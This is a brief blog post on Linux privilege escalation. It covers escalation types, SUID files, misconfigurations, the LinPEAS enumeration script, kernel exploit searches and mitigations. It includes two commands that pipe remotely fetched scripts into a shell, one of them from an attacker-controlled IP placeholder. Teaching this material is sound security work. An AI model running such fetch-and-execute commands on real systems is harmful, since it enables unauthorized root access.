---
title: "Linux Privilege Escalation"
date: 2023-10-29 12:00:00 -0000
categories: [Privilege Escalation]
tags: [privilege escalation, linux]
---

## Introduction

Privilege escalation is a critical aspect of cybersecurity. It involves exploiting a vulnerability in an operating system or application to gain elevated access to resources that are normally protected from an application or user.

## Types of Privilege Escalation

### Vertical Privilege Escalation
Vertical privilege escalation occurs when a user gains higher privileges than they are authorized for. For example, a normal user gaining root access.

### Horizontal Privilege Escalation
Horizontal privilege escalation occurs when a user gains access to resources or functions of another user with similar privileges.

## Common Techniques

### SUID/GUID Files
Files with the SUID or GUID bit set can be exploited to execute with the privileges of the file owner or group.

### Exploiting Weak Configurations
Misconfigurations, such as weak file permissions or improper service settings, can be exploited for privilege escalation.

## Linpeas

Linpeas is a script that automates the process of searching for privilege escalation vectors on linux systems. It scans the system for common misconfigurations, vulnerabilities, and weak permissions that can be exploited by an attacker to gain elevated privileges.

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
curl <my_ip>/linpeas.sh | bash
```

## Kernel Exploits

```bash
uname -a
```

Search for kernel exploits using [Exploit Database](https://www.exploit-db.com/) or [Searchsploit](https://www.exploit-db.com/searchsploit).

## Mitigation Strategies

- Regularly update and patch systems.
- Implement the principle of least privilege.
- Conduct regular security audits and vulnerability assessments.
- Use security tools to monitor and detect unusual activities.

## Conclusion

Understanding and mitigating privilege escalation vulnerabilities is essential for maintaining the security of Linux systems. By following best practices and staying informed about the latest threats, you can protect your systems from unauthorized access.



[GTFOBINS] (https://gtfobins.github.io/) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.



> **Tip**: Always look for every possible way to escalate privileges, as even seemingly minor misconfigurations can lead to significant security risks.         




